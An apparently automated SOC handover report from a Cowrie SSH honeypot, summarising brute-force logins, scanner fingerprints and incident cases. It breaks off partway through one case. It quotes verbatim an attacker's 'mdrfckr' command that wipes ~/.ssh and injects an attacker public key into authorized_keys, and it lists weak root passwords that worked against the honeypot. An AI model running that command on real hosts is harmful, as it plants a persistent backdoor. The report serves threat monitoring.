# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-29 |
| **Generated At** | 2026-05-29T12:50:02Z |
| **Shift Time** | 12:50 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **793** |
| Confirmed Threats | **769** |
| False Positives Filtered | **24** (3.0%) |
| Unique Attacker IPs | **30** |
| Countries of Origin | **10** |
| High Severity Cases | **31** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **762** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **92** |
| Unique Credential Pairs | **88** |
| Unique Usernames | **53** |
| Unique Passwords | **74** |
| Successful Auth Pairs | **31** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 32 |
| `345gs5662d34` | 3 |
| `hadoop` | 2 |
| `user` | 2 |
| `admin` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 12 |
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |
| `123` | 3 |
| `1qaz@WSX` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 3 |
| `root` | `debian` | 1 |
| `airflow` | `airflow` | 1 |
| `frappe` | `frappe@123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `debian` | `171.217.75.25` | 2026-05-29T09:54:04 |
| `root` | `q1w2e3r4t5y6` | `8.219.138.86` | 2026-05-29T10:42:26 |
| `root` | `3245gs5662d34` | `8.219.138.86` | 2026-05-29T10:42:29 |
| `root` | `QWEqwe123` | `120.48.115.34` | 2026-05-29T10:42:35 |
| `root` | `test1234` | `120.48.115.34` | 2026-05-29T10:42:39 |
| `root` | `Aa@123456` | `120.48.115.34` | 2026-05-29T10:43:33 |
| `root` | `Qwerty` | `120.48.115.34` | 2026-05-29T10:43:43 |
| `root` | `123@@@` | `120.48.115.34` | 2026-05-29T10:44:31 |
| `root` | `null` | `120.48.115.34` | 2026-05-29T10:46:44 |
| `root` | `1Q2W3E4R` | `120.48.115.34` | 2026-05-29T10:48:13 |
| `root` | `admin@123` | `120.48.115.34` | 2026-05-29T10:48:45 |
| `root` | `12345678` | `120.48.115.34` | 2026-05-29T10:50:17 |
| `root` | `1Q2w3e4r` | `120.48.115.34` | 2026-05-29T10:53:37 |
| `root` | `a123456A` | `120.48.115.34` | 2026-05-29T10:53:43 |
| `root` | `aa123456` | `120.48.115.34` | 2026-05-29T11:02:49 |
| `root` | `qwerty123` | `120.48.115.34` | 2026-05-29T11:03:20 |
| `root` | `1qaz2wsx` | `120.48.115.34` | 2026-05-29T11:03:21 |
| `root` | `123321` | `120.48.115.34` | 2026-05-29T11:04:41 |
| `root` | `rootroot` | `120.48.115.34` | 2026-05-29T11:04:44 |
| `root` | `Admin@123` | `120.48.115.34` | 2026-05-29T11:05:15 |
| `root` | `123456789` | `120.48.115.34` | 2026-05-29T11:05:53 |
| `root` | `12345` | `120.48.115.34` | 2026-05-29T11:06:01 |
| `root` | `toor` | `120.48.115.34` | 2026-05-29T11:06:02 |
| `root` | `123` | `120.48.115.34` | 2026-05-29T11:06:17 |
| `root` | `1qaz@WSX` | `120.48.115.34` | 2026-05-29T11:06:45 |
| `root` | `P@ssw0rd` | `120.48.115.34` | 2026-05-29T11:06:49 |
| `root` | `1` | `120.48.115.34` | 2026-05-29T11:07:25 |
| `root` | `password.123` | `103.171.85.117` | 2026-05-29T12:31:00 |
| `root` | `3245gs5662d34` | `103.171.85.117` | 2026-05-29T12:31:03 |
| `root` | `iloveyou` | `157.10.160.222` | 2026-05-29T12:37:12 |
| `root` | `3245gs5662d34` | `157.10.160.222` | 2026-05-29T12:37:16 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **793** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 152 |
| libssh | 74 |
| OpenSSH | 3 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 148 | 1 |
| `f555226df196...` | Mirai/variant | 14 | 6 |
| `c118de82e19e...` | Mirai/variant | 2 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 148 | 1 | Generic scanner |
| `95420f9d932d...` | libssh | 60 | 4 | — |
| `f555226df196...` | libssh | 14 | 6 | Mirai/variant |
| `c118de82e19e...` | OpenSSH | 2 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.171.85.117`, `157.10.160.222`, `8.219.138.86`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **30** |
| Unique ASNs | **24** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS16509` | Amazon.com, Inc. | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | LOW |
| `AS43766` | Mobile Telecommunication Company Saudi Arabia Joint-Stock company | 1 | HIGH |
| `AS17639` | Converge ICT Solutions Inc. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (31)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-fdba5f781087

| Field | Detail |
|---|---|
| **Source IP** | `171.217.75[.]25` |
| **First Seen** | 2026-05-29 09:53 |
| **Last Seen** | 2026-05-29 09:55 |
| **Session Duration** | 112s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 09:53:50` | `cowrie.session.connect` |
| `2026-05-29 09:54:03` | `cowrie.client.version` |
| `2026-05-29 09:54:03` | `cowrie.client.kex` |
| `2026-05-29 09:54:04` | `cowrie.login.success` |
| `2026-05-29 09:55:42` | `cowrie.session.file_upload` |
| `2026-05-29 09:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.217.75[.]25` to AbuseIPDB if not already reported
- [ ] Block `171.217.75[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98de6f477ad4

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 10:42 |
| **Last Seen** | 2026-05-29 10:47 |
| **Session Duration** | 317s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 10:42:22` | `cowrie.session.connect` |
| `2026-05-29 10:42:22` | `cowrie.client.version` |
| `2026-05-29 10:42:28` | `cowrie.client.kex` |
| `2026-05-29 10:42:39` | `cowrie.login.success` |
| `2026-05-29 10:47:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f40f2fb86d01

| Field | Detail |
|---|---|
| **Source IP** | `8.219.138[.]86` |
| **First Seen** | 2026-05-29 10:42 |
| **Last Seen** | 2026-05-29 10:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 10:42:26` | `cowrie.session.connect` |
| `2026-05-29 10:42:26` | `cowrie.client.version` |
| `2026-05-29 10:42:26` | `cowrie.client.kex` |
| `2026-05-29 10:42:26` | `cowrie.login.success` |
| `2026-05-29 10:42:27` | `cowrie.session.params` |
| `2026-05-29 10:42:27` | `cowrie.command.input` |
| `2026-05-29 10:42:27` | `cowrie.command.failed` |
| `2026-05-29 10:42:27` | `cowrie.log.closed` |
| `2026-05-29 10:42:27` | `cowrie.session.params` |
| `2026-05-29 10:42:27` | `cowrie.command.input` |
| `2026-05-29 10:42:27` | `cowrie.session.file_download` |
| `2026-05-29 10:42:27` | `cowrie.log.closed` |
| `2026-05-29 10:42:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.219.138[.]86` to AbuseIPDB if not already reported
- [ ] Block `8.219.138[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97ee3ceaa6b2

| Field | Detail |
|---|---|
| **Source IP** | `8.219.138[.]86` |
| **First Seen** | 2026-05-29 10:42 |
| **Last Seen** | 2026-05-29 10:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 10:42:28` | `cowrie.session.connect` |
| `2026-05-29 10:42:28` | `cowrie.client.version` |
| `2026-05-29 10:42:29` | `cowrie.client.kex` |
| `2026-05-29 10:42:29` | `cowrie.login.success` |
| `2026-05-29 10:42:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.219.138[.]86` to AbuseIPDB if not already reported
- [ ] Block `8.219.138[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-546bc77faffb

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 10:42 |
| **Last Seen** | 2026-05-29 10:43 |
| **Session Duration** | 70s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 10:42:29` | `cowrie.session.connect` |
| `2026-05-29 10:42:29` | `cowrie.client.version` |
| `2026-05-29 10:42:29` | `cowrie.client.kex` |
| `2026-05-29 10:42:35` | `cowrie.login.success` |
| `2026-05-29 10:42:55` | `cowrie.session.params` |
| `2026-05-29 10:42:55` | `cowrie.command.input` |
| `2026-05-29 10:43:40` | `cowrie.log.closed` |
| `2026-05-29 10:43:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09b613599ec9

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 10:43 |
| **Last Seen** | 2026-05-29 10:48 |
| **Session Duration** | 308s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 10:43:24` | `cowrie.session.connect` |
| `2026-05-29 10:43:24` | `cowrie.client.version` |
| `2026-05-29 10:43:29` | `cowrie.client.kex` |
| `2026-05-29 10:43:33` | `cowrie.login.success` |
| `2026-05-29 10:43:39` | `cowrie.session.params` |
| `2026-05-29 10:43:39` | `cowrie.command.input` |
| `2026-05-29 10:48:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8977ac68bb84

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 10:43 |
| **Last Seen** | 2026-05-29 10:45 |
| **Session Duration** | 121s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 10:43:26` | `cowrie.session.connect` |
| `2026-05-29 10:43:26` | `cowrie.client.version` |
| `2026-05-29 10:43:27` | `cowrie.client.kex` |
| `2026-05-29 10:43:43` | `cowrie.login.success` |
| `2026-05-29 10:45:11` | `cowrie.session.params` |
| `2026-05-29 10:45:11` | `cowrie.command.input` |
| `2026-05-29 10:45:13` | `cowrie.log.closed` |
| `2026-05-29 10:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4e2b7827c4c

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 10:44 |
| **Last Seen** | 2026-05-29 10:44 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 10:44:11` | `cowrie.session.connect` |
| `2026-05-29 10:44:26` | `cowrie.client.version` |
| `2026-05-29 10:44:26` | `cowrie.client.kex` |
| `2026-05-29 10:44:31` | `cowrie.login.success` |
| `2026-05-29 10:44:34` | `cowrie.session.params` |
| `2026-05-29 10:44:34` | `cowrie.command.input` |
| `2026-05-29 10:44:37` | `cowrie.log.closed` |
| `2026-05-29 10:44:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-053ff09339e4

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 10:45 |
| **Last Seen** | 2026-05-29 10:48 |
| **Session Duration** | 167s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 10:45:43` | `cowrie.session.connect` |
| `2026-05-29 10:45:43` | `cowrie.client.version` |
| `2026-05-29 10:46:18` | `cowrie.client.kex` |
| `2026-05-29 10:46:44` | `cowrie.login.success` |
| `2026-05-29 10:46:59` | `cowrie.session.params` |
| `2026-05-29 10:46:59` | `cowrie.command.input` |
| `2026-05-29 10:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b12036b8e190

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 10:47 |
| **Last Seen** | 2026-05-29 10:48 |
| **Session Duration** | 53s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 10:47:39` | `cowrie.session.connect` |
| `2026-05-29 10:47:39` | `cowrie.client.version` |
| `2026-05-29 10:47:40` | `cowrie.client.kex` |
| `2026-05-29 10:48:13` | `cowrie.login.success` |
| `2026-05-29 10:48:28` | `cowrie.session.params` |
| `2026-05-29 10:48:28` | `cowrie.command.input` |
| `2026-05-29 10:48:30` | `cowrie.log.closed` |
| `2026-05-29 10:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b160171ce98

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 10:48 |
| **Last Seen** | 2026-05-29 10:49 |
| **Session Duration** | 58s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 10:48:33` | `cowrie.session.connect` |
| `2026-05-29 10:48:33` | `cowrie.client.version` |
| `2026-05-29 10:48:33` | `cowrie.client.kex` |
| `2026-05-29 10:48:45` | `cowrie.login.success` |
| `2026-05-29 10:49:25` | `cowrie.session.params` |
| `2026-05-29 10:49:25` | `cowrie.command.input` |
| `2026-05-29 10:49:30` | `cowrie.log.closed` |
| `2026-05-29 10:49:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe517bfb19fa

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 10:50 |
| **Last Seen** | 2026-05-29 10:50 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 10:50:08` | `cowrie.session.connect` |
| `2026-05-29 10:50:09` | `cowrie.client.version` |
| `2026-05-29 10:50:10` | `cowrie.client.kex` |
| `2026-05-29 10:50:17` | `cowrie.login.success` |
| `2026-05-29 10:50:40` | `cowrie.session.params` |
| `2026-05-29 10:50:40` | `cowrie.command.input` |
| `2026-05-29 10:50:48` | `cowrie.log.closed` |
| `2026-05-29 10:50:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f423207af5a3

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 10:51 |
| **Last Seen** | 2026-05-29 10:57 |
| **Session Duration** | 330s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 10:51:59` | `cowrie.session.connect` |
| `2026-05-29 10:51:59` | `cowrie.client.version` |
| `2026-05-29 10:52:19` | `cowrie.client.kex` |
| `2026-05-29 10:53:37` | `cowrie.login.success` |
| `2026-05-29 10:53:43` | `cowrie.session.params` |
| `2026-05-29 10:53:43` | `cowrie.command.input` |
| `2026-05-29 10:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddb6952992e6

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 10:52 |
| **Last Seen** | 2026-05-29 10:54 |
| **Session Duration** | 119s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 10:52:01` | `cowrie.session.connect` |
| `2026-05-29 10:53:07` | `cowrie.client.version` |
| `2026-05-29 10:53:07` | `cowrie.client.kex` |
| `2026-05-29 10:53:43` | `cowrie.login.success` |
| `2026-05-29 10:53:52` | `cowrie.session.params` |
| `2026-05-29 10:53:52` | `cowrie.command.input` |
| `2026-05-29 10:53:57` | `cowrie.log.closed` |
| `2026-05-29 10:54:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ed824721231

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 11:02 |
| **Last Seen** | 2026-05-29 11:04 |
| **Session Duration** | 112s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 11:02:25` | `cowrie.session.connect` |
| `2026-05-29 11:02:25` | `cowrie.client.version` |
| `2026-05-29 11:03:07` | `cowrie.client.kex` |
| `2026-05-29 11:03:20` | `cowrie.login.success` |
| `2026-05-29 11:03:28` | `cowrie.session.params` |
| `2026-05-29 11:03:28` | `cowrie.command.input` |
| `2026-05-29 11:04:17` | `cowrie.log.closed` |
| `2026-05-29 11:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2da53900c6e

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 11:02 |
| **Last Seen** | 2026-05-29 11:07 |
| **Session Duration** | 320s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 11:02:28` | `cowrie.session.connect` |
| `2026-05-29 11:02:29` | `cowrie.client.version` |
| `2026-05-29 11:02:41` | `cowrie.client.kex` |
| `2026-05-29 11:02:49` | `cowrie.login.success` |
| `2026-05-29 11:03:32` | `cowrie.session.params` |
| `2026-05-29 11:03:32` | `cowrie.command.input` |
| `2026-05-29 11:07:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9021af762cf9

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 11:02 |
| **Last Seen** | 2026-05-29 11:03 |
| **Session Duration** | 52s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 11:02:31` | `cowrie.session.connect` |
| `2026-05-29 11:02:57` | `cowrie.client.version` |
| `2026-05-29 11:02:57` | `cowrie.client.kex` |
| `2026-05-29 11:03:21` | `cowrie.login.success` |
| `2026-05-29 11:03:22` | `cowrie.session.params` |
| `2026-05-29 11:03:22` | `cowrie.command.input` |
| `2026-05-29 11:03:24` | `cowrie.log.closed` |
| `2026-05-29 11:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02f074f769c4

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 11:03 |
| **Last Seen** | 2026-05-29 11:07 |
| **Session Duration** | 215s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 11:03:46` | `cowrie.session.connect` |
| `2026-05-29 11:04:05` | `cowrie.client.version` |
| `2026-05-29 11:04:05` | `cowrie.client.kex` |
| `2026-05-29 11:04:41` | `cowrie.login.success` |
| `2026-05-29 11:07:09` | `cowrie.session.params` |
| `2026-05-29 11:07:09` | `cowrie.command.input` |
| `2026-05-29 11:07:13` | `cowrie.log.closed` |
| `2026-05-29 11:07:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f845d23531b7

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 11:04 |
| **Last Seen** | 2026-05-29 11:05 |
| **Session Duration** | 96s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
